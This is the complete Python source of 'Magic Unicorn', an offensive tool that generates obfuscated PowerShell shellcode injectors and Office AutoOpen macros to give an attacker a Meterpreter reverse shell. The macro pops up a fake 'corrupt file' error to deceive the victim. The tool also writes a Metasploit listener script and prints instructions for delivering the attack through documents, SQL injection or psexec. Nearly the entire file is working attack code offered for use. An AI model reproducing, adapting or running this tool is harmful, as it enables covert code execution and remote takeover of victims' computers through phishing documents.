#!/usr/bin/python
#
# Magic Unicorn - PowerShell downgrade attack tool
#
# Written by: Dave Kennedy (@HackingDave)
# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
#
# Real quick down and dirty for native x86 powershell on any platform
#
# Usage: python unicorn.py payload reverse_ipaddr port
# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
#
# Requirements: Need to have Metasploit installed.
#
# Special thanks to Matthew Graeber and Josh Kelley
#
import base64
import re
import subprocess
import sys

def gen_unicorn():
                print r"""
                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:
                """


# split string
def split_str(s, length):
    return [s[i:i+length] for i in range(0, len(s), length)]

# generate full macro
def genMacro(full_attack):
    #start of the macro
    macro_str = """Sub AutoOpen()
		Dim x
    		x = """
    linelength = 380
    powershell_command_list = split_str(full_attack, linelength)

    for line in powershell_command_list:
        macro_str +=  "& \"" + line + "\" _\n"

    # remove trailing "_ \r\n"
    macro_str = macro_str[:-4]
    # remove first occurence of &
    macro_str = macro_str.replace("& ","",1)

    # end of macro
    macro_str += """
    Shell ("POWERSHELL.EXE " & x)
    Dim title As String
    title = "Critical Microsoft Office Error"
    Dim msg As String
    Dim intResponse As Integer
    msg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."
    intResponse = MsgBox(msg, 16, title)
    Application.Quit
    End Sub
    """
    return macro_str

# generate base shellcode
def generate_shellcode(payload,ipaddr,port):
    print "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode..."
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (payload,ipaddr,port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : '', 'Found 0 compatible encoders' : '', 'unsignedcharbuf[]=' : ''}
    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
    return data

def format_payload(payload, ipaddr, port, macro):
    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger floater and write out data
    floater = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        floater = floater + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]
    
    # one line shellcode injection with native x86 shellcode
    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$cmd = "-nop -noni -enc ";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $x86 $cmd $e"}else{;iex "& powershell $cmd $e";}""" %  (shellcode))

    full_attack = "powershell -nop -win hidden -noni -enc " + base64.b64encode(powershell_code.encode('utf_16_le'))  
    
    if macro == "macro":
        macro = genMacro(full_attack)
        filewrite = file("powershell_attack.txt", "w")
        filewrite.write(macro)
        filewrite.close()

    else:
        # write out powershell attacks
        filewrite = file("powershell_attack.txt", "w")
        filewrite.write(full_attack)
        filewrite.close()

    # write out rc file
    filewrite = file("unicorn.rc", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (payload,ipaddr,port))
    filewrite.close()

    gen_unicorn()
    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
    print "Twitter: @TrustedSec, @HackingDave"
    print "\nHappy Magic Unicorns."

    if len(macro) > 30:
	    print """
[*******************************************************************************************************]

      				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you
do that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated
code into that. This will automatically run. Note that a message will prompt to the user saying that
the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is 
tricking the victim to thinking the excel document is corrupted. You should get a shell through
powershell injection after that.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED
TO REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR
WILL HAPPEN!
[*******************************************************************************************************]

"""

    print """
[*******************************************************************************************************]

			      -----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains
all of the code needed in order to inject the powershell attack into memory. Note you will need a place
that supports remote command injection of some sort. Often times this could be through an excel/word 
doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and 
scenarios to where you can use this attack at. Simply paste the powershell_attacks.txt command in
any command prompt window or where you have the ability to call the powershell executable and it
will give a shell back to you. Note that you will need to have a listener enabled in order to capture
the attack.
[*******************************************************************************************************] 
"""	    
    print "[*] Exported powershell output code to powershell_attack.txt."
    print "[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener."


# pull the variables needed for usage
try:

    # if we are using macros
    if len(sys.argv) > 4:
        payload = sys.argv[1]
        ipaddr = sys.argv[2]
        port = sys.argv[3]
        macro = sys.argv[4]
        format_payload(payload,ipaddr,port, macro)

    # regular unicorn attack
    elif len(sys.argv) > 3:
        	payload = sys.argv[1]
        	ipaddr = sys.argv[2]
        	port = sys.argv[3]
        	macro = ""
        	format_payload(payload,ipaddr,port, macro)

    # if we did supply parameters
    elif len(sys.argv) < 3:
		gen_unicorn()
		print "-------------------- Magic Unicorn Attack Vector -----------------------------"
	        print "\nReal quick down and dirty for native x86 powershell injection on any platform"
	        print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
	        print "Twitter: @TrustedSec, @HackingDave"
	        print "\nHappy Magic Unicorns."
	        print ""
	        print "Usage: python unicorn.py payload reverse_ipaddr port"
	        print "Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"
		print "Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro"

except Exception, e:
	print "[!] Something went wrong, printing the error: " + str(e)
